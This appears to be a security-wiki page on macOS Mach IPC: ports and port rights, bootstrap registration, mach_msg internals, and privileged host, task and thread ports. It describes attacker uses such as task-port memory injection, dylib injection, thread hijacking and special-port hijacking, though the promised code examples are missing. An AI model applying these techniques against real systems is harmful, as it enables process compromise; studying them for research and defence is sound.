## Mach messaging via Ports

### Basic Information

Mach uses **tasks** as the **smallest unit** for sharing resources, and each task can contain **multiple threads**. These **tasks and threads are mapped 1:1 to POSIX processes and threads**.

Communication between tasks occurs via Mach Inter-Process Communication (IPC), utilising one-way communication channels. **Messages are transferred between ports**, which act kind of **message queues** managed by the kernel.

A **port** is the **basic** element of Mach IPC. It can be used to **send messages and to receive** them.

Each process has an **IPC table**, in there it's possible to find the **mach ports of the process**. The name of a mach port is actually a number (a pointer to the kernel object).

A process can also send a port name with some rights **to a different task** and the kernel will make this entry in the **IPC table of the other task** appear.

### Port Rights

Port rights, which define what operations a task can perform, are key to this communication. The possible **port rights** are ([definitions from here](https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html)):

- **Receive right**, which allows receiving messages sent to the port. Mach ports are MPSC (multiple-producer, single-consumer) queues, which means that there may only ever be **one receive right for each port** in the whole system (unlike with pipes, where multiple processes can all hold file descriptors to the read end of one pipe).
  - A **task with the Receive** right can receive messages and **create Send rights**, allowing it to send messages. Originally only the **own task has Receive right over its por**t.
  - If the owner of the Receive right **dies** or kills it, the **send right becomes useless (dead name).**
- **Send right**, which allows sending messages to the port.
  - The Send right can be **cloned** so a task owning a Send right can clone the right and **grant it to a third task**.
  - Note that **port rights** can also be **passed** though Mac messages.
- **Send-once right**, which allows sending one message to the port and then disappears.
  - This right **cannot** be **cloned**, but it can be **moved**.
- **Port set right**, which denotes a _port set_ rather than a single port. Dequeuing a message from a port set dequeues a message from one of the ports it contains. Port sets can be used to listen on several ports simultaneously, a lot like `select`/`poll`/`epoll`/`kqueue` in Unix.
- **Dead name**, which is not an actual port right, but merely a placeholder. When a port is destroyed, all existing port rights to the port turn into dead names.

**Tasks can transfer SEND rights to others**, enabling them to send messages back. **SEND rights can also be cloned, so a task can duplicate and give the right to a third task**. This, combined with an intermediary process known as the **bootstrap server**, allows for effective communication between tasks.

### File Ports

File ports allows to encapsulate file descriptors in Mac ports (using Mach port rights). It's possible to create a `fileport` from a given FD using `fileport_makeport` and create a FD froma. fileport using `fileport_makefd`.

### Establishing a communication

As mentioned previously, it's possible to send rights using Mach messages, however, you **cannot send a right without already having a right** to send a Mach message. So, how is the first communication stablished?

For this, he **bootstrap server** (**launchd** in mac) is involved, as **everyone can get a SEND right to the bootstrap server**, it's possible to ask it for a right to send a message to another process:

1. Task **A** creates a **new port**, getting the **RECEIVE right** over it.
2. Task **A**, being the holder of the RECEIVE right, **generates a SEND right for the port**.
3. Task **A** establishes a **connection** with the **bootstrap server**, and **sends it the SEND right** for the port it generated at the beginning.
   - Remember that anyone can get a SEND right to the bootstrap server.
4. Task A sends a `bootstrap_register` message to the bootstrap server to **associate the given port with a name** like `com.apple.taska`
5. Task **B** interacts with the **bootstrap server** to execute a bootstrap **lookup for the service** name (`bootstrap_lookup`). So the bootstrap server can respond, task B will send it a **SEND right to a port it previously created** inside the lookup message. If the lookup is successful, the **server duplicates the SEND right** received from Task A and **transmits it to Task B**.
   - Remember that anyone can get a SEND right to the bootstrap server.
6. With this SEND right, **Task B** is capable of **sending** a **message** **to Task A**.
7. For a bi-directional communication usually task **B** generates a new port with a **RECEIVE** right and a **SEND** right, and gives the **SEND right to Task A** so it can send messages to TASK B (bi-directional communication).

The bootstrap server **cannot authenticate** the service name claimed by a task. This means a **task** could potentially **impersonate any system task**, such as falsely **claiming an authorization service name** and then approving every request.

Then, Apple stores the **names of system-provided services** in secure configuration files, located in **SIP-protected** directories: `/System/Library/LaunchDaemons` and `/System/Library/LaunchAgents`. Alongside each service name, the **associated binary is also stored**. The bootstrap server, will create and hold a **RECEIVE right for each of these service names**.

For these predefined services, the **lookup process differs slightly**. When a service name is being looked up, launchd starts the service dynamically. The new workflow is as follows:

- Task **B** initiates a bootstrap **lookup** for a service name.
- **launchd** checks if the task is running and if it isnâ€™t, **starts** it.
- Task **A** (the service) performs a **bootstrap check-in** (`bootstrap_check_in()`). Here, the **bootstrap** server creates a SEND right, retains it, and **transfers the RECEIVE right to Task A**.
- launchd duplicates the **SEND right and sends it to Task B**.
- Task **B** generates a new port with a **RECEIVE** right and a **SEND** right, and gives the **SEND right to Task A** (the svc) so it can send messages to TASK B (bi-directional communication).

However, this process only applies to predefined system tasks. Non-system tasks still operate as described originally, which could potentially allow for impersonation.

> [!CAUTION]
> Therefore, launchd should never crash or the whole sysem will crash.

### A Mach Message

[Find more info here](https://sector7.computest.nl/post/2023-10-xpc-audit-token-spoofing/)

The `mach_msg` function, essentially a system call, is utilized for sending and receiving Mach messages. The function requires the message to be sent as the initial argument. This message must commence with a `mach_msg_header_t` structure, succeeded by the actual message content. The structure is defined as follows:

```c
typedef struct {
	mach_msg_bits_t               msgh_bits;
	mach_msg_size_t               msgh_size;
	mach_port_t                   msgh_remote_port;
	mach_port_t                   msgh_local_port;
	mach_port_name_t              msgh_voucher_port;
	mach_msg_id_t                 msgh_id;
} mach_msg_header_t;
```

Processes possessing a _**receive right**_ can receive messages on a Mach port. Conversely, the **senders** are granted a _**send**_ or a _**send-once right**_. The send-once right is exclusively for sending a single message, after which it becomes invalid.

The initial field **`msgh_bits`** is a bitmap:

- First bit (most significative) is used to indicate that a message is complex (more on this below)
- The 3rd and 4th are used by the kernel
- The **5 least significant bits of the 2nd byte** from can be used for **voucher**: another type of port to send key/value combinations.
- The **5 least significant bits of the 3rd byte** from can be used for **local port**
- The **5 least significant bits of the 4th byte** from can be used for **remote port**

The types that can be specified in the voucher, local and remote ports are (from [**mach/message.h**](https://opensource.apple.com/source/xnu/xnu-7195.81.3/osfmk/mach/message.h.auto.html)):

```c
#define MACH_MSG_TYPE_MOVE_RECEIVE      16      /* Must hold receive right */
#define MACH_MSG_TYPE_MOVE_SEND         17      /* Must hold send right(s) */
#define MACH_MSG_TYPE_MOVE_SEND_ONCE    18      /* Must hold sendonce right */
#define MACH_MSG_TYPE_COPY_SEND         19      /* Must hold send right(s) */
#define MACH_MSG_TYPE_MAKE_SEND         20      /* Must hold receive right */
#define MACH_MSG_TYPE_MAKE_SEND_ONCE    21      /* Must hold receive right */
#define MACH_MSG_TYPE_COPY_RECEIVE      22      /* NOT VALID */
#define MACH_MSG_TYPE_DISPOSE_RECEIVE   24      /* must hold receive right */
#define MACH_MSG_TYPE_DISPOSE_SEND      25      /* must hold send right(s) */
#define MACH_MSG_TYPE_DISPOSE_SEND_ONCE 26      /* must hold sendonce right */
```

For example, `MACH_MSG_TYPE_MAKE_SEND_ONCE` can be used to **indicate** that a **send-once** **right** should be derived and transferred for this port. It can also be specified `MACH_PORT_NULL` to prevent the recipient to be able to reply.

In order to achieve an easy **bi-directional communication** a process can specify a **mach port** in the mach **message header** called the _reply port_ (**`msgh_local_port`**) where the **receiver** of the message can **send a reply** to this message.

> [!TIP]
> Note that this kind of bi-directional communication is used in XPC messages that expect a replay (`xpc_connection_send_message_with_reply` and `xpc_connection_send_message_with_reply_sync`). But **usually different ports are created** as explained previously to create the bi-directional communication.

The other fields of the message header are:

- `msgh_size`: the size of the entire packet.
- `msgh_remote_port`: the port on which this message is sent.
- `msgh_voucher_port`: [mach vouchers](https://robert.sesek.com/2023/6/mach_vouchers.html).
- `msgh_id`: the ID of this message, which is interpreted by the receiver.

> [!CAUTION]
> Note that **mach messages are sent over a `mach port`**, which is a **single receiver**, **multiple sender** communication channel built into the mach kernel. **Multiple processes** can **send messages** to a mach port, but at any point only **a single process can read** from it.

Messages are then formed by the **`mach_msg_header_t`** header followed by the **body** and by the **trailer** (if any) and it can grant permission to reply to it. In these cases, the kernel just need to pass the message from one task to the other.

A **trailer** is **information added to the message by the kernel** (cannot be set by the user) which can be requested in message reception with the flags `MACH_RCV_TRAILER_<trailer_opt>` (there is different information that can be requested).

#### Complex Messages

However, there are other more **complex** messages, like the ones passing additional port rights or sharing memory, where the kernel also needs to send these objects to the recipient. In this cases the most significant bit of the header `msgh_bits` is set.

The possible descriptors to pass are defined in [**`mach/message.h`**](https://opensource.apple.com/source/xnu/xnu-7195.81.3/osfmk/mach/message.h.auto.html):

```c
#define MACH_MSG_PORT_DESCRIPTOR                0
#define MACH_MSG_OOL_DESCRIPTOR                 1
#define MACH_MSG_OOL_PORTS_DESCRIPTOR           2
#define MACH_MSG_OOL_VOLATILE_DESCRIPTOR        3
#define MACH_MSG_GUARDED_PORT_DESCRIPTOR        4

#pragma pack(push, 4)

typedef struct{
	natural_t                     pad1;
	mach_msg_size_t               pad2;
	unsigned int                  pad3 : 24;
	mach_msg_descriptor_type_t    type : 8;
} mach_msg_type_descriptor_t;
```

In 32bits, all the descriptors are 12B and the descriptor type is in the 11th one. In 64 bits, the sizes vary.

> [!CAUTION]
> The kernel will copy the descriptors from one task to the other but first **creating a copy in kernel memory**. This technique, known as "Feng Shui" has been abused in several exploits to make the **kernel copy data in its memory** making a process send descriptors to itself. Then the process can receive the messages (the kernel will free them).
>
> It's also possible to **send port rights to a vulnerable process**, and the port rights will just appear in the process (even if he isn't handling them).

### Mac Ports APIs

Note that ports are associated to the task namespace, so to create or search for a port, the task namespace is also queried (more in `mach/mach_port.h`):

- **`mach_port_allocate` | `mach_port_construct`**: **Create** a port.
  - `mach_port_allocate` can also create a **port set**: receive right over a group of ports. Whenever a message is received it's indicated the port from where it was.
- `mach_port_allocate_name`: Change the name of the port (by default 32bit integer)
- `mach_port_names`: Get port names from a target
- `mach_port_type`: Get rights of a task over a name
- `mach_port_rename`: Rename a port (like dup2 for FDs)
- `mach_port_allocate`: Allocate a new RECEIVE, PORT_SET or DEAD_NAME
- `mach_port_insert_right`: Create a new right in a port where you have RECEIVE
- `mach_port_...`
- **`mach_msg`** | **`mach_msg_overwrite`**: Functions used to **send and receive mach messages**. The overwrite version allows to specify a different buffer for message reception (the other version will just reuse it).

### Debug mach_msg

As the functions **`mach_msg`** and **`mach_msg_overwrite`** are the ones used to send a receive messages, setting a breakpoint on them would allow to inspect the sent a received messages.

For example start debugging any application you can debug as it will load **`libSystem.B` which will use this function**.

To get the arguments of **`mach_msg`** check the registers. These are the arguments (from [mach/message.h](https://opensource.apple.com/source/xnu/xnu-7195.81.3/osfmk/mach/message.h.auto.html)):

```c
__WATCHOS_PROHIBITED __TVOS_PROHIBITED
extern mach_msg_return_t        mach_msg(
	mach_msg_header_t *msg,
	mach_msg_option_t option,
	mach_msg_size_t send_size,
	mach_msg_size_t rcv_size,
	mach_port_name_t rcv_name,
	mach_msg_timeout_t timeout,
	mach_port_name_t notify);
```

Get the values from the registries:

```armasm
reg read $x0 $x1 $x2 $x3 $x4 $x5 $x6
      x0 = 0x0000000124e04ce8 ;mach_msg_header_t (*msg)
      x1 = 0x0000000003114207 ;mach_msg_option_t (option)
      x2 = 0x0000000000000388 ;mach_msg_size_t (send_size)
      x3 = 0x0000000000000388 ;mach_msg_size_t (rcv_size)
      x4 = 0x0000000000001f03 ;mach_port_name_t (rcv_name)
      x5 = 0x0000000000000000 ;mach_msg_timeout_t (timeout)
      x6 = 0x0000000000000000 ;mach_port_name_t (notify)
```

Inspect the message header checking the first argument:

```armasm

0x124e04ce8: 0x00131513 0x00000388 0x00000807 0x00001f03
0x124e04cf8: 0x00000b07 0x40000322

; 0x00131513 -> mach_msg_bits_t (msgh_bits) = 0x13 (MACH_MSG_TYPE_COPY_SEND) in local | 0x1500 (MACH_MSG_TYPE_MAKE_SEND_ONCE) in remote | 0x130000 (MACH_MSG_TYPE_COPY_SEND) in voucher
; 0x00000388 -> mach_msg_size_t (msgh_size)

; 0x00000b07 -> mach_port_name_t (msgh_voucher_port)
; 0x40000322 -> mach_msg_id_t (msgh_id)
```

That type of `mach_msg_bits_t` is very common to allow a reply.

The **name** is the default name given to the port (check how it's **increasing** in the first 3 bytes). The **`ipc-object`** is the **obfuscated** unique **identifier** of the port.\
Note also how the ports with only **`send`** right are **identifying the owner** of it (port name + pid).\
Also note the use of **`+`** to indicate **other tasks connected to the same port**.

It's also possible to use [**procesxp**](https://www.newosxbook.com/tools/procexp.html) to see also the **registered service names** (with SIP disabled due to the need of `com.apple.system-task-port`):

```
procesp 1 ports
```

### Code example

Note how the **sender** **allocates** a port, create a **send right** for the name `org.darlinghq.example` and send it to the **bootstrap server** while the sender asked for the **send right** of that name and used it to **send a message**.

## Privileged Ports

There are some special ports that allows to **perform certain sensitive actions or access certain sensitive data** in case a tasks have the **SEND** permissions over them. This makes these ports very interesting from an attackers perspective not only because of the capabilities but because it's possible to **share SEND permissions across tasks**.

### Host Special Ports

These ports are represented by a number.

**SEND** rights can be obtained by calling **`host_get_special_port`** and **RECEIVE** rights calling **`host_set_special_port`**. However, both calls require the **`host_priv`** port which only root can access. Moreover, in the past root was able to call **`host_set_special_port`** and hijack arbitrary that allowed for example to bypass code signatures by hijacking `HOST_KEXTD_PORT` (SIP now prevents this).

These are divided in 2 groups: The **first 7 ports are owned by the kernel** being the 1 `HOST_PORT`, the 2 `HOST_PRIV_PORT` , the 3 `HOST_IO_MASTER_PORT` and the 7 is `HOST_MAX_SPECIAL_KERNEL_PORT`.\
The ones starting **from** the number **8** are **owned by system daemons** and they can be found declared in [**`host_special_ports.h`**](https://opensource.apple.com/source/xnu/xnu-4570.1.46/osfmk/mach/host_special_ports.h.auto.html).

- **Host port**: If a process has **SEND** privilege over this port he can get **information** about the **system** calling its routines like:
  - `host_processor_info`: Get processor info
  - `host_info`: Get host info
  - `host_virtual_physical_table_info`: Virtual/Physical page table (requires MACH_VMDEBUG)
  - `host_statistics`: Get host statistics
  - `mach_memory_info`: Get kernel memory layout
- **Host Priv port**: A process with **SEND** right over this port can perform **privileged actions** like showing boot data or trying to load a kernel extension. The **process need to be root** to get this permission.
  - Moreover, in order to call **`kext_request`** API it's needed to have other entitlements **`com.apple.private.kext*`** which are only given to Apple binaries.
  - Other routines that can be called are:
    - `host_get_boot_info`: Get `machine_boot_info()`
    - `host_priv_statistics`: Get privileged statistics
    - `vm_allocate_cpm`: Allocate Contiguous Physical Memory
    - `host_processors`: Send right to host processors
    - `mach_vm_wire`: Make memory resident
  - As **root** can access this permission, it could call `host_set_[special/exception]_port[s]` to **hijack host special or exception ports**.

It's possible to **see all the host special ports** by running:

```bash
procexp all ports | grep "HSP"
```

### Task Special Ports

These are ports reserved for well known services. It's possible to get/set them calling `task_[get/set]_special_port`. They can be found in `task_special_ports.h`:

```c
typedef	int	task_special_port_t;

#define TASK_KERNEL_PORT	1	/* Represents task to the outside
					   world.*/
#define TASK_HOST_PORT		2	/* The host (priv) port for task.  */
#define TASK_BOOTSTRAP_PORT	4	/* Bootstrap environment for task. */
#define TASK_WIRED_LEDGER_PORT	5	/* Wired resource ledger for task. */
#define TASK_PAGED_LEDGER_PORT	6	/* Paged resource ledger for task. */
```

From [here](https://web.mit.edu/darwin/src/modules/xnu/osfmk/man/task_get_special_port.html):

- **TASK_KERNEL_PORT**\[task-self send right]: The port used to control this task. Used to send messages that affect the task. This is the port returned by **mach_task_self (see Task Ports below)**.
- **TASK_BOOTSTRAP_PORT**\[bootstrap send right]: The task's bootstrap port. Used to send messages requesting return of other system service ports.
- **TASK_HOST_NAME_PORT**\[host-self send right]: The port used to request information of the containing host. This is the port returned by **mach_host_self**.
- **TASK_WIRED_LEDGER_PORT**\[ledger send right]: The port naming the source from which this task draws its wired kernel memory.
- **TASK_PAGED_LEDGER_PORT**\[ledger send right]: The port naming the source from which this task draws its default memory managed memory.

### Task Ports

Originally Mach didn't have "processes" it had "tasks" which was considered more like a container of threads. When Mach was merged with BSD **each task was correlated with a BSD process**. Therefore every BSD process has the details it needs to be a process and every Mach task also have its inner workings (except for the inexistent pid 0 which is the `kernel_task`).

There are two very interesting functions related to this:

- `task_for_pid(target_task_port, pid, &task_port_of_pid)`: Get a SEND right for the task por of the task related to the specified by the `pid` and give it to the indicated `target_task_port` (which is usually the caller task which has used `mach_task_self()`, but could be a SEND port over a different task.)
- `pid_for_task(task, &pid)`: Given a SEND right to a task, find to which PID this task is related to.

In order to perform actions within the task, the task needed a `SEND` right to itself calling `mach_task_self()` (which uses the `task_self_trap` (28)). With this permission a task can perform several actions like:

- `task_threads`: Get SEND right over all task ports of the threads of the task
- `task_info`: Get info about a task
- `task_suspend/resume`: Suspend or resume a task
- `task_[get/set]_special_port`
- `thread_create`: Create a thread
- `task_[get/set]_state`: Control task state
- and more can be found in [**mach/task.h**](https://github.com/phracker/MacOSX-SDKs/blob/master/MacOSX11.3.sdk/System/Library/Frameworks/Kernel.framework/Versions/A/Headers/mach/task.h)

> [!CAUTION]
> Notice that with a SEND right over a task port of a **different task**, it's possible to perform such actions over a different task.

Moreover, the task_port is also the **`vm_map`** port which allows to **read an manipulate memory** inside a task with functions such as `vm_read()` and `vm_write()`. This basically means that a task with SEND rights over the task_port of a different task is going to be able to **inject code into that task**.

Remember that because the **kernel is also a task**, if someone manages to get a **SEND permissions** over the **`kernel_task`**, it'll be able to make the kernel execute anything (jailbreaks).

- Call `mach_task_self()` to **get the name** for this port for the caller task. This port is only **inherited** across **`exec()`**; a new task created with `fork()` gets a new task port (as a special case, a task also gets a new task port after `exec()`in a suid binary). The only way to spawn a task and get its port is to perform the ["port swap dance"](https://robert.sesek.com/2014/1/changes_to_xnu_mach_ipc.html) while doing a `fork()`.
- These are the restrictions to access the port (from `macos_task_policy` from the binary `AppleMobileFileIntegrity`):
  - If the app has **`com.apple.security.get-task-allow` entitlement** processes from the **same user can access the task port** (commonly added by Xcode for debugging). The **notarization** process won't allow it to production releases.
  - Apps with the **`com.apple.system-task-ports`** entitlement can get the **task port for any** process, except the kernel. In older versions it was called **`task_for_pid-allow`**. This is only granted to Apple applications.
  - **Root can access task ports** of applications **not** compiled with a **hardened** runtime (and not from Apple).

**The task name port:** An unprivileged version of the _task port_. It references the task, but does not allow controlling it. The only thing that seems to be available through it is `task_info()`.

### Thread Ports

Threads also have associated ports, which are visible from the task calling **`task_threads`** and from the processor with `processor_set_threads`. A SEND right to the thread port allows to use the function from the `thread_act` subsystem, like:

- `thread_terminate`
- `thread_[get/set]_state`
- `act_[get/set]_state`
- `thread_[suspend/resume]`
- `thread_info`
- ...

Any thread can get this port calling to **`mach_thread_sef`**.

### Dylib Injection in thread via Task port

In macOS **threads** might be manipulated via **Mach** or using **posix `pthread` api**. The thread we generated in the previous injection, was generated using Mach api, so **it's not posix compliant**.

It was possible to **inject a simple shellcode** to execute a command because it **didn't need to work with posix** compliant apis, only with Mach. **More complex injections** would need the **thread** to be also **posix compliant**.

Therefore, to **improve the thread** it should call **`pthread_create_from_mach_thread`** which will **create a valid pthread**. Then, this new pthread could **call dlopen** to **load a dylib** from the system, so instead of writing new shellcode to perform different actions it's possible to load custom libraries.

You can find **example dylibs** in (for example the one that generates a log and then you can listen to it):

### Thread Hijacking via Task port <a href="#step-1-thread-hijacking" id="step-1-thread-hijacking"></a>

In this technique a thread of the process is hijacked:

### Task Port Injection Detection

When calling `task_for_pid` or `thread_create_*` increments a counter in the struct task from the kernel which can by accessed from user mode calling task_info(task, TASK_EXTMOD_INFO, ...)

## Exception Ports

When a exception occurs in a thread, this exception is sent to the designated exception port of the thread. If the thread doesn't handle it, then it's sent to the task exception ports. If the task doesn't handle it, then it's sent to the host port which is managed by launchd (where it'll be acknowledge). This is called exception triage.

Note that at the end usually if not properly handle the report will end up being handle by the ReportCrash daemon. However, it's possible for another thread in the same task to manage the exception, this is what crash reporting tools like `PLCreashReporter` does.

## Other Objects

### Clock

Any user can access information about the clock however in order to set the time or modify other settings one has to be root.

In order to get info its possible to call functions from the `clock` subsystem like: `clock_get_time`, `clock_get_attributtes` or `clock_alarm`\
In order to modify values the `clock_priv` subsystem can be sued with functions like `clock_set_time` and `clock_set_attributes`

### Processors and Processor Set

The processor apis allows to control a single logical processor calling functions like `processor_start`, `processor_exit`, `processor_info`, `processor_get_assignment`...

Moreover, the **processor set** apis provides a way to group multiple processors into a group. It's possible to retrieve the default processor set calling **`processor_set_default`**.\
These are some interesting APIs to interact with the processor set:

- `processor_set_statistics`
- `processor_set_tasks`: Return an array of send rights to all tasks inside the processor set
- `processor_set_threads`: Return an array of send rights to all threads inside the processor set
- `processor_set_stack_usage`
- `processor_set_info`

As mentioned in [**this post**](https://reverse.put.as/2014/05/05/about-the-processor_set_tasks-access-to-kernel-memory-vulnerability/), in the past this allowed to bypass the previously mentioned protection to get task ports in other processes to control them by calling **`processor_set_tasks`** and getting a host port on every process.\
Nowadays you need root to use that function and this is protected so you will only be able to get these ports on unprotected processes.

You can try it with:

## XPC

### Basic Information

XPC, which stands for XNU (the kernel used by macOS) inter-Process Communication, is a framework for **communication between processes** on macOS and iOS. XPC provides a mechanism for making **safe, asynchronous method calls between different processes** on the system. It's a part of Apple's security paradigm, allowing for the **creation of privilege-separated applications** where each **component** runs with **only the permissions it needs** to do its job, thereby limiting the potential damage from a compromised process.

For more information about how this **communication work** on how it **could be vulnerable** check:

## MIG - Mach Interface Generator

MIG was created to **simplify the process of Mach IPC** code creation. This is because a lot of work to program RPC involves the same actions (packing arguments, sending the msg, unpacking the data in the server...).

MIC basically **generates the needed code** for server and client to communicate with a given definition (in IDL -Interface Definition language-). Even if the generated code is ugly, a developer will just need to import it and his code will be much simpler than before.
